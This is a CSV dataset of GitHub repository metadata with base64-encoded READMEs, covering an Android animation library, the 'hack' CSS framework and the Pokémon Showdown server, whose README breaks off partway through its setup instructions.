name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
T1RUT01fUE9JTlRbMF0sIEJPVFRPTV9QT0lOVFsxXSk7CiAgICBwYXRoLnF1
YWRUbyhMRUZUX0NPTlRST0xfUE9JTlRbMF0sIExFRlRfQ09OVFJPTF9QT0lO
VFsxXSwgU1RBUlRfUE9JTlRbMF0sIFNUQVJUX1BPSU5UWzFdKTsKICAgIHBh
dGguY2xvc2UoKTsKICAgIFZpZXdBbmltYXRvci5hbmltYXRlKHZpZXcpLnBh
dGgocGF0aCkucmVwZWF0Q291bnQoLTEpLnN0YXJ0KCk7CmBgYAoKCiMgRG93
bmxvYWQKCjxhIGhyZWY9J2h0dHBzOi8va28tZmkuY29tL0ExNjBMQ0MnIHRh
cmdldD0nX2JsYW5rJz48aW1nIGhlaWdodD0nMzYnIHN0eWxlPSdib3JkZXI6
MHB4O2hlaWdodDozNnB4Oycgc3JjPSdodHRwczovL2F6NzQzNzAyLnZvLm1z
ZWNuZC5uZXQvY2RuL2tvZmkxLnBuZz92PTAnIGJvcmRlcj0nMCcgYWx0PSdC
dXkgTWUgYSBDb2ZmZWUgYXQga28tZmkuY29tJyAvPjwvYT4KCkFkZCBpbnRv
IHlvdXIgKipidWlsZC5ncmFkbGUqKgoKWyFbRG93bmxvYWRdKGh0dHBzOi8v
YXBpLmJpbnRyYXkuY29tL3BhY2thZ2VzL2Zsb3JlbnQzNy9tYXZlbi9WaWV3
QW5pbWF0b3IvaW1hZ2VzL2Rvd25sb2FkLnN2ZyldKGh0dHBzOi8vYmludHJh
eS5jb20vZmxvcmVudDM3L21hdmVuL1ZpZXdBbmltYXRvci9fbGF0ZXN0VmVy
c2lvbikKCmBgYGdyb292eQpjb21waWxlICdjb20uZ2l0aHViLmZsb3JlbnQz
Nzp2aWV3YW5pbWF0b3I6MS4xLjAnCmBgYAoKIyBDb21tdW5pdHkKCkxvb2tp
bmcgZm9yIGNvbnRyaWJ1dG9ycywgZmVlbCBmcmVlIHRvIGZvcmsgIQoKIyBD
cmVkaXRzCgpBdXRob3I6IEZsb3JlbnQgQ2hhbXBpZ255ICAgCkNvbnRyaWJ1
dG9yOiBb5p2O546J5rGfKGxpeXVqaWFuZyldKGh0dHBzOi8vZ2l0aHViLmNv
bS9nenUtbGl5dWppYW5nL1ZpZXdBbmltYXRvcikgICAKCkZpY2hlcyBQbGF0
ZWF1IE1vdG8gOiBbaHR0cHM6Ly93d3cuZmljaGVzLXBsYXRlYXUtbW90by5m
ci9dKGh0dHBzOi8vd3d3LmZpY2hlcy1wbGF0ZWF1LW1vdG8uZnIvKQoKPGEg
aHJlZj0iaHR0cHM6Ly9nb28uZ2wvV1hXOERjIj4KICA8aW1nIGFsdD0iQW5k
cm9pZCBhcHAgb24gR29vZ2xlIFBsYXkiIHNyYz0iaHR0cHM6Ly9kZXZlbG9w
ZXIuYW5kcm9pZC5jb20vaW1hZ2VzL2JyYW5kL2VuX2FwcF9yZ2Jfd29fNDUu
cG5nIiAvPgo8L2E+Cgo8YSBocmVmPSJodHRwczovL3BsdXMuZ29vZ2xlLmNv
bS8rZmxvcmVudGNoYW1waWdueSI+CiAgPGltZyBhbHQ9IkZvbGxvdyBtZSBv
biBHb29nbGUrIgogICAgICAgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2Vy
Y29udGVudC5jb20vZmxvcmVudDM3L0RhVmluY2kvbWFzdGVyL21vYmlsZS9z
cmMvbWFpbi9yZXMvZHJhd2FibGUtaGRwaS9ncGx1cy5wbmciIC8+CjwvYT4K
PGEgaHJlZj0iaHR0cHM6Ly90d2l0dGVyLmNvbS9mbG9yZW50X2NoYW1wIj4K
ICA8aW1nIGFsdD0iRm9sbG93IG1lIG9uIFR3aXR0ZXIiCiAgICAgICBzcmM9
Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mbG9yZW50Mzcv
RGFWaW5jaS9tYXN0ZXIvbW9iaWxlL3NyYy9tYWluL3Jlcy9kcmF3YWJsZS1o
ZHBpL3R3aXR0ZXIucG5nIiAvPgo8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZnIu
bGlua2VkaW4uY29tL2luL2Zsb3JlbnRjaGFtcGlnbnkiPgogIDxpbWcgYWx0
PSJGb2xsb3cgbWUgb24gTGlua2VkSW4iCiAgICAgICBzcmM9Imh0dHBzOi8v
cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mbG9yZW50MzcvRGFWaW5jaS9t
YXN0ZXIvbW9iaWxlL3NyYy9tYWluL3Jlcy9kcmF3YWJsZS1oZHBpL2xpbmtl
ZGluLnBuZyIgLz4KPC9hPgoKIyBMaWNlbnNlCgogICAgQ29weXJpZ2h0IDIw
MTUgZmxvcmVudDM3LCBJbmMuCgogICAgTGljZW5zZWQgdW5kZXIgdGhlIEFw
YWNoZSBMaWNlbnNlLCBWZXJzaW9uIDIuMCAodGhlICJMaWNlbnNlIik7CiAg
ICB5b3UgbWF5IG5vdCB1c2UgdGhpcyBmaWxlIGV4Y2VwdCBpbiBjb21wbGlh
bmNlIHdpdGggdGhlIExpY2Vuc2UuCiAgICBZb3UgbWF5IG9idGFpbiBhIGNv
cHkgb2YgdGhlIExpY2Vuc2UgYXQKCiAgICAgICBodHRwOi8vd3d3LmFwYWNo
ZS5vcmcvbGljZW5zZXMvTElDRU5TRS0yLjAKCiAgICBVbmxlc3MgcmVxdWly
ZWQgYnkgYXBwbGljYWJsZSBsYXcgb3IgYWdyZWVkIHRvIGluIHdyaXRpbmcs
IHNvZnR3YXJlCiAgICBkaXN0cmlidXRlZCB1bmRlciB0aGUgTGljZW5zZSBp
cyBkaXN0cmlidXRlZCBvbiBhbiAiQVMgSVMiIEJBU0lTLAogICAgV0lUSE9V
VCBXQVJSQU5USUVTIE9SIENPTkRJVElPTlMgT0YgQU5ZIEtJTkQsIGVpdGhl
ciBleHByZXNzIG9yIGltcGxpZWQuCiAgICBTZWUgdGhlIExpY2Vuc2UgZm9y
IHRoZSBzcGVjaWZpYyBsYW5ndWFnZSBnb3Zlcm5pbmcgcGVybWlzc2lvbnMg
YW5kCiAgICBsaW1pdGF0aW9ucyB1bmRlciB0aGUgTGljZW5zZS4K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'hack',63490836,b'\xe2\x9b\xb7 Dead simple CSS framework.',b'CSS',20,2377,,2377,False,b'https://api.github.com/repos/egoist/hack/forks',"PHAgYWxpZ249ImNlbnRlciI+CiAgPGltZyBzcmM9Ii4vbWVkaWEvbG9nby5w
bmciIHdpZHRoPSI2MCIgLz48YnI+PGJyPgogIDxhIGhyZWY9Imh0dHBzOi8v
bnBtanMuY29tL3BhY2thZ2UvaGFjayI+PGltZyBzcmM9Imh0dHBzOi8vaW1n
LnNoaWVsZHMuaW8vbnBtL3YvaGFjay5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUi
IGFsdD0ibnBtIHZlcnNpb24iPjwvYT4gPGEgaHJlZj0iaHR0cHM6Ly9ucG1q
cy5jb20vcGFja2FnZS9oYWNrIj48aW1nIHNyYz0iaHR0cHM6Ly9pbWcuc2hp
ZWxkcy5pby9ucG0vZG0vaGFjay5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUiIGFs
dD0ibnBtIGRvd25sb2FkcyI+PC9hPiA8YSBocmVmPSJodHRwczovL2dpdHRl
ci5pbS9lZ29pc3QvaGFjayI+PGltZyBzcmM9Imh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vZ2l0dGVyL3Jvb20vZWdvaXN0L2hhY2suc3ZnP3N0eWxlPWZsYXQt
c3F1YXJlIiBhbHQ9IkdpdHRlciI+PC9hPgo8L3A+Cgo8ZGV0YWlscz48c3Vt
bWFyeT5UYWJsZSBvZiBDb250ZW50czwvc3VtbWFyeT4KCjwhLS0gdG9jIC0t
PgoKLSBbSW5zdGFsbF0oI2luc3RhbGwpCi0gW1JlbGF0ZWQgcHJvamVjdHNd
KCNyZWxhdGVkLXByb2plY3RzKQotIFtEZXZlbG9wbWVudF0oI2RldmVsb3Bt
ZW50KQotIFtMaWNlbnNlXSgjbGljZW5zZSkKCjwhLS0gdG9jc3RvcCAtLT4K
CjwvZGV0YWlscz4KCiMjIEluc3RhbGwKCmBgYGJhc2gKJCBucG0gaW5zdGFs
bCAtLXNhdmUgaGFjawpgYGAKCk9wdGlvbiAjMTogVXNlIGFueSBwcmUtcHJv
Y2Vzc29yCgpgYGBqcwppbXBvcnQgJ2hhY2snCmBgYAoKT3B0aW9uICMyOiBo
b3QtbGluayB0aGUgY3NzIGZpbGVzOgoKYGBgaHRtbAo8bGluayByZWw9InN0
eWxlc2hlZXQiIGhyZWY9Ii9wYXRoL3RvL2hhY2suY3NzIj4KCjwhLS0gbWFy
a2Rvd24gdGhlbWUgLS0+Cjxib2R5IGNsYXNzPSJoYWNrIj48L2JvZHk+Cgo8
IS0tIHN0YW5kYXJkIHRoZW1lIC0tPgo8bGluayByZWw9InN0eWxlc2hlZXQi
IGhyZWY9Ii9wYXRoL3RvL3N0YW5kYXJkLmNzcyI+Cjxib2R5IGNsYXNzPSJz
dGFuZGFyZCI+PC9ib2R5PgoKPCEtLSBkYXJrIHRoZW1lIC0tPgo8bGluayBy
ZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9wYXRoL3RvL2RhcmsuY3NzIj4KPGJv
ZHkgY2xhc3M9ImhhY2sgZGFyayI+PC9ib2R5PgoKPCEtLSBkYXJrLWdyZXkg
dGhlbWUgLS0+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3BhdGgv
dG8vZGFyay1ncmV5LmNzcyI+Cjxib2R5IGNsYXNzPSJoYWNrIGRhcmstZ3Jl
eSI+PC9ib2R5PgoKPCEtLSBzb2xhcml6ZWQtZGFyayB0aGVtZSAtLT4KPGxp
bmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvcGF0aC90by9zb2xhcml6ZWQt
ZGFyay5jc3MiPgo8Ym9keSBjbGFzcz0iaGFjayBzb2xhcml6ZWQtZGFyayI+
PC9ib2R5PgpgYGAKCkl0J3MgYWxzbyBhdmFpbGFibGUgb24gW0NETkpTXSho
dHRwczovL2NkbmpzLmNvbS9saWJyYXJpZXMvaGFjayksIFtqc0RlbGl2cl0o
aHR0cDovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2hhY2svZGlzdC8pIGFuZCBb
VU5QS0ddKGh0dHBzOi8vdW5wa2cuY29tL2hhY2svKS4KCkZvciBtb3JlIHVz
YWdlcyBhbmQgc3R5bGUgZ3VpZGVsaW5lIGhlYWQgdG8gW3RoZSB3ZWJzaXRl
XShodHRwOi8vaGFja2Nzcy5lZ29pc3QubW9lLykg8J+OiQoKIyMgU2hvd2Nh
c2UKCltBIGxpc3Qgb2YgcHJvamVjdHMgdGhhdCB1c2UgYGhhY2tgXShodHRw
czovL2dpdGh1Yi5jb20vZWdvaXN0L2hhY2svd2lraS9TaG93Y2FzZSkuCgoj
IyBSZWxhdGVkIHByb2plY3RzCgotIFtKZWt5bGwgdGhlbWUgZm9yIEhhY2td
KGh0dHBzOi8vZ2l0aHViLmNvbS93ZW1ha2Utc2VydmljZXMvamVreWxsLXRo
ZW1lLWhhY2tjc3MpCi0gW0h1Z28gdGhlbWUgZm9yIEhhY2tdKGh0dHBzOi8v
YWZ0ZXItZGFyay5oYWJkLmFzKQotIFtHdXRlbmJlcmcgdGhlbWUgZm9yIEhh
Y2tdKGh0dHBzOi8vd3d3LmdldGd1dGVuYmVyZy5pby90aGVtZXMvYWZ0ZXIt
ZGFyay8pCgojIyBNaXJyb3JzCgotIGh0dHBzOi8vZ2l0LmhhYmQuYXMvamhh
YmRhcy9oYWNrCgojIyBEZXZlbG9wbWVudAoKYGBgYmFzaAokIG5wbSBydW4g
ZGV2CgokIG5wbSBydW4gYnVpbGQKYGBgCgojIyBMaWNlbnNlCgpNSVQgJmNv
cHk7IFtFR09JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9lZ29pc3QpCgpMb2dv
IHdhcyBnZW5lcmF0ZWQgd2l0aCBbc2xvZ2FuXShodHRwczovL2dpdGh1Yi5j
b20vZWdvaXN0L3Nsb2dhbikuCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'pokemon-showdown',3038446,b'Pok\xc3\xa9mon battle simulator.',b'JavaScript',111,2377,,2377,False,b'https://api.github.com/repos/smogon/pokemon-showdown/forks',"UG9rw6ltb24gU2hvd2Rvd24KPT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
CgpOYXZpZ2F0aW9uOiBbV2Vic2l0ZV1bMV0gfCAqKlNlcnZlciByZXBvc2l0
b3J5KiogfCBbQ2xpZW50IHJlcG9zaXRvcnldWzJdIHwgW0RleCByZXBvc2l0
b3J5XVszXQoKICBbMV06IGh0dHA6Ly9wb2tlbW9uc2hvd2Rvd24uY29tLwog
IFsyXTogaHR0cHM6Ly9naXRodWIuY29tL1phcmVsL1Bva2Vtb24tU2hvd2Rv
d24tQ2xpZW50CiAgWzNdOiBodHRwczovL2dpdGh1Yi5jb20vWmFyZWwvUG9r
ZW1vbi1TaG93ZG93bi1EZXgKClshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90
cmF2aXMtY2kuY29tL3Ntb2dvbi9wb2tlbW9uLXNob3dkb3duLnN2Zz9icmFu
Y2g9bWFzdGVyKV0oaHR0cHM6Ly90cmF2aXMtY2kuY29tL3Ntb2dvbi9wb2tl
bW9uLXNob3dkb3duKQpbIVtEZXBlbmRlbmN5IFN0YXR1c10oaHR0cHM6Ly9k
YXZpZC1kbS5vcmcvemFyZWwvUG9rZW1vbi1TaG93ZG93bi5zdmcpXShodHRw
czovL2RhdmlkLWRtLm9yZy96YXJlbC9Qb2tlbW9uLVNob3dkb3duKQpbIVtk
ZXZEZXBlbmRlbmN5IFN0YXR1c10oaHR0cHM6Ly9kYXZpZC1kbS5vcmcvemFy
ZWwvUG9rZW1vbi1TaG93ZG93bi9kZXYtc3RhdHVzLnN2ZyldKGh0dHBzOi8v
ZGF2aWQtZG0ub3JnL3phcmVsL1Bva2Vtb24tU2hvd2Rvd24/dHlwZT1kZXYp
ClshW1RvdGFsIEFsZXJ0c10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9sZ3Rt
L2FsZXJ0cy9nL1phcmVsL1Bva2Vtb24tU2hvd2Rvd24uc3ZnP2xvZ289bGd0
bSZsb2dvV2lkdGg9MTgpXShodHRwczovL2xndG0uY29tL3Byb2plY3RzL2cv
WmFyZWwvUG9rZW1vbi1TaG93ZG93bi9hbGVydHMpCgpJbnRyb2R1Y3Rpb24K
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpUaGlzIGlzIHRoZSBzb3Vy
Y2UgY29kZSBmb3IgdGhlIGdhbWUgc2VydmVyIG9mIFtQb2vDqW1vbiBTaG93
ZG93bl1bNF0sIGEgd2Vic2l0ZSBmb3IgUG9rw6ltb24gYmF0dGxpbmcuIFBv
a8OpbW9uIFNob3dkb3duIHNpbXVsYXRlcyBzaW5nbGVzLCBkb3VibGVzIGFu
ZCB0cmlwbGVzIGJhdHRsZXMgaW4gYWxsIHRoZSBnYW1lcyBvdXQgc28gZmFy
IChHZW5lcmF0aW9ucyAxIHRocm91Z2ggOCkuCgpUaGlzIHJlcG9zaXRvcnkg
Y29udGFpbnMgdGhlIGZpbGVzIG5lZWRlZCB0byBzZXQgdXAgeW91ciBvd24g
UG9rw6ltb24gU2hvd2Rvd24gc2VydmVyLiBOb3RlIHRoYXQgdG8gc2V0IHVw
IGEgc2VydmVyLCB5b3UnbGwgYWxzbyBuZWVkIGEgc2VydmVyIGNvbXB1dGVy
LgoKWW91IGNhbiB1c2UgeW91ciBvd24gY29tcHV0ZXIgYXMgYSBzZXJ2ZXIs
IGJ1dCBmb3Igb3RoZXIgcGVvcGxlIHRvIGNvbm5lY3QgdG8geW91ciBjb21w
dXRlciwgeW91J2xsIG5lZWQgdG8gZXhwb3NlIGEgcG9ydCAoZGVmYXVsdCBp
cyA4MDAwIGJ1dCB5b3UgY2FuIGNob29zZSBhIGRpZmZlcmVudCBvbmUpIHRv
IGNvbm5lY3QgdG8sIHdoaWNoIHNvbWV0aW1lcyByZXF1aXJlcyBbcG9ydCBm
b3J3YXJkaW5nXVs1XS4gTm90ZSB0aGF0IHNvbWUgaW50ZXJuZXQgcHJvdmlk
ZXJzIGRvbid0IGxldCB5b3UgaG9zdCBhIHNlcnZlciBhdCBhbGwsIGluIHdo
aWNoIGNhc2UgeW91J2xsIGhhdmUgdG8gcmVudCBhIFZQUyB0byB1c2UgYXMg
YSBzZXJ2ZXIuCgogIFs0XTogaHR0cDovL3Bva2Vtb25zaG93ZG93bi5jb20v
CiAgWzVdOiBodHRwOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1BvcnRfZm9y
d2FyZGluZwoKCkluc3RhbGxpbmcKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tCgogICAgLi9wb2tlbW9uLXNob3dkb3duCgooUmVxdWlyZXMgTm9kZS5q
cyB2MTArKQoKSWYgeW91ciBkaXN0cm8gcGFja2FnZSBtYW5hZ2VyIGhhcyBh
biBvbGQgTm9kZS5qcyB2ZXJzaW9uLCB0aGUgc2ltcGxlc3Qgd2F5IHRvIHVw
Z3JhZGUgaXMgYG5gIOKAkyB1c3VhbGx5IG5vIHJvb3QgbmVjZXNzYXJ5OgoK
ICAgIG5wbSBpbnN0YWxsIC0tZ2xvYmFsIG4KICAgIG4gbGF0ZXN0CgoKRGV0
YWlsZWQgaW5zdGFsbGF0aW9uIGluc3RydWN0aW9ucwotLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0KClBva8OpbW9uIFNob3dkb3duIHJlcXVpcmVzIHlv
dSB0byBoYXZlIFtOb2RlLmpzXVs2XSBpbnN0YWxsZWQsIHYxMC54IG9yIGxh
dGVyLgoKTmV4dCwgb2J0YWluIGEgY29weSBvZiBQb2vDqW1vbiBTaG93ZG93
bi4gSWYgeW91J3JlIHJlYWRpbmcgdGhpcyBvdXRzaWRlIG9mIEdpdEh1Yiwg
eW91J3ZlIHByb2JhYmx5IGFscmVhZHkgZG9uZSB0aGlzLiBJZiB5b3UncmUg
cmVhZGluZyB0aGlzIGluIEdpdEh1YiwgdGhlcmUncyBhICJDbG9uZSBvciBk
b3dubG9hZCIgYnV0dG9uIG5lYXIgdGhlIHRvcCByaWdodCAoaXQncyBncmVl
bikuIEkgcmVjb21tZW5kIHRoZSAiT3BlbiBpbiBEZXNrdG9wIiBtZXRob2Qg
LSB5b3UgbmVlZCB0byBpbnN0YWxsIEdpdEh1YiBEZXNrdG9wIHdoaWNoIGlz
IG1vcmUgd29yayB0aGFuICJEb3dubG9hZCBaSVAiLCBidXQgaXQgbWFrZXMg
aXQgbXVjaCBlYXNpZXIgdG8gdXBkYXRlIGluIHRoZSBsb25nIHJ1biAoaXQg
bGV0cyB5b3UgdXNlIHRoZSBgL3VwZGF0ZXNlcnZlcmAgY29tbWFuZCkuCgpQ
b2vDqW1vbiBTaG93ZG93biBpcyBpbnN0YWxsZWQgYW5kIHJ1biB1c2luZyBh
IGNvbW1hbmQgbGluZS4gSW4gTWFjIE9TIFgsIG9wZW4gYFRlcm1pbmFsYCAo
aXQncyBpbiBVdGlsaXRpZXMpLiBJbiBXaW5kb3dzLCBvcGVuIGBDb21tYW5k
IFByb21wdGAgKHR5cGUgYGNtZGAgaW50byB0aGUgU3RhcnQgbWVudSBhbmQg
aXQgc2hvdWxkIGJlIHRoZSBmaXJzdCByZXN1bHQpLiBUeXBlIHRoaXMgaW50
byB0aGUgY29tbWFuZCBsaW5lOgoKICAgIGNkIExPQ0FUSU9OCgpSZXBsYWNl
IGBMT0NBVElPTmAgd2l0aCB0aGUgbG9jYXRpb24gUG9rw6ltb24gU2hvd2Rv
d24gaXMgaW4gKGVuZGluZyB1cCB3aXRoLCBmb3IgaW5zdGFuY2UsIGBjZCAi
fi9Eb3dubG9hZHMvUG9rZW1vbi1TaG93ZG93biJgIG9yIGBjZCAiQzpcVXNl
cnNcQm9iXERvd25sb2Fkc1xQb2tlbW9uLVNob3dkb3duXCJgKS4KClRoaXMg
d2lsbCBzZXQgeW91ciBjb21tYW5kIGxpbmUncyBsb2NhdGlvbiB0byBQb2vD
qW1vbiBTaG93ZG93bidzIGZvbGRlci4gWW91J2xsIGhhdmUgdG8gZG8gdGhp
cyBlYWNoIHRpbWUgeW91IG9wZW4gYSBjb21tYW5kIGxpbmUgdG8gcnVuIGNv
bW1hbmRzIGZvciBQb2vDqW1vbiBTaG93ZG93bi4KCkNvcHkgYGNvbmZpZy9j
b25maWctZXhhbXBsZS5qc2AgaW50byBgY29uZmlnL2NvbmZpZy5qc2AsIGFu
ZCBlZGl0IGFzIHlvdSBwbGVhc2UuCgpDb25ncmF0dWxhdGlvbnMsIHlvdSdy
ZSBkb25lIHNldHRpbmcgdXAgUG9rw6ltb24gU2hvd2Rvd24uCgpOb3csIHRv
IHN0YXJ0IFBva8OpbW9uIFNob3dkb3duLCBydW4gdGhlIGNvbW1hbmQ6Cgog
ICAgbm9kZSBwb2tlbW9uLXNob3dkb3duCgooSWYgeW91J3JlIG5vdCBvbiBX
aW5kb3dzLCB3ZSByZWNvbW1lbmQgZG9pbmcgYC4vcG9rZW1vbi1zaG93ZG93
bmAgaW5zdGVhZC4pCgpZb3UgY2FuIGFsc28gc3BlY2lmeSBhIHBvcnQ6Cgog
ICAgbm9kZSBwb2tlbW9uLXNob3dkb3duIDgwMDAKClZpc2l0IHlvdXIgc2Vy
dmVyIGF0IGBodHRwOi8vU0VSVkVSOjgwMDBgCgpSZXBsYWNlIGBTRVJWRVJg
IHdpdGggeW91ciBzZXJ2ZXIgZG9tYWluIG9yIElQLiBSZXBsYWNlIGA4MDAw
YCB3aXRoIHlvdXIgcG9ydCBpZiBpdCdzIG5vdCBgODAwMGAgKHRoZSBkZWZh
dWx0IHBvcnQpLgoKWWVzLCB5b3UgY2FuIHRlc3QgZXZlbiBpZiB5b3UgYXJl
IGJlaGluZCBhIE5BVCB3aXRob3V0IHBvcnQgZm9yd2FyZGluZzogYGh0dHA6
Ly9sb2NhbGhvc3Q6ODAwMGAgd2lsbCBjb25uZWN0IHRvIHlvdXIgbG9jYWwg
bWFjaGluZS4gU29tZSBicm93c2VyIHNldHVwcyBtaWdodCBwcmV2ZW50IHRo
aXMgc29ydCBvZiBjb25uZWN0aW9uLCBob3dldmVyIChOb1NjcmlwdCwgZm9y
IGluc3RhbmNlKS4gSWYgeW91IGNhbid0IGdldCBjb25uZWN0aW5nIGxvY2Fs
bHkgdG8gd29yayBpbiBGaXJlZm94LCB0cnkgQ2hyb21lLgoKWW91IHdpbGwg
YmUgcmVkaXJlY3RlZCB0byBgaHR0cDovL1NFUlZFUi5wc2ltLnVzYC4gVGhl
IHJlYXNvbiB5b3VyIHNlcnZlciBpcyB2aXNpdGVkIHRocm91Z2ggYHBzaW0u
dXNgIGlzIHRvIG1ha2UgaXQgbW9yZSBkaWZmaWN1bHQgZm9yIHNlcnZlcnMg
dG8gc2VlIGEgdXNlcidzIHBhc3N3b3JkIGluIGFueSBmb3JtLCBieSBoYW5k
bGluZyBsb2dpbnMgZ2xvYmFsbHkuIFlvdSBjYW4gZW1iZWQgdGhpcyBpbiBh
biBgaWZyYW1lYCBpbiB5b3VyIHdlYnNpdGUgaWYgdGhlIFVSTCBpcyBhIGJp
ZyBkZWFsIHdpdGggeW91LgoKSWYgeW91IHRydWx5IHdhbnQgdG8gaG9zdCB0
aGUgY2xpZW50IHlvdXJzZWxmLCB0aGVyZSBpcyBbYSByZXBvc2l0b3J5IGZv
ciB0aGUgUG9rw6ltb24gU2hvd2Rvd24gQ2xpZW50XVs3XS4gSXQncyBub3Qg
cmVjb21tZW5kZWQgZm9yIGJlZ2lubmVycywgdGhvdWdoLgoKICBbNl06IGh0
dHBzOi8vbm9kZWpzLm9yZy8KICBbN106IGh0dHBzOi8vZ2l0aHViLmNvbS9a
YXJlbC9Qb2tlbW9uLVNob3dkb3duLUNsaWVudAoKClNldHRpbmcgdXAgYW4g
QWRtaW5pc3RyYXRvciBhY2NvdW50Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQoKT25jZSB5b3VyIHNlcnZlciBpcyB1cCwgeW91IHByb2JhYmx5IHdh
bnQgdG8gbWFrZSB5b3Vyc2VsZiBhbiBBZG1pbmlzdHJhdG9yICh+KSBvbiBp
dC4KCiMjIyBjb25maWcvdXNlcmdyb3Vwcy5jc3YKClRvIGJlY29tZSBhbiBB
ZG1pbmlzdHJhdG9yLCBjcmVhdGUgYSBmaWxlIG5hbWVkIGBjb25maWcvdXNl
cmdyb3Vwcy5jc3ZgIGNvbnRhaW5pbmcKCiAgICBVU0VSLH4KClJlcGxhY2Ug
YFVTRVJgIHdpdGggdGhlIHVzZXJuYW1lIHRoYXQgeW91IHdvdWxkIGxpa2Ug
dG8gYmVjb21lIGFuIEFkbWluaXN0cmF0b3IuIERvIG5vdCBwdXQgYSBzcGFj
ZSBiZXR3ZWVuIHRoZSBjb21tYSBhbmQgdGhlIHRpbGRlLgoKVGhpcyB1c2Vy
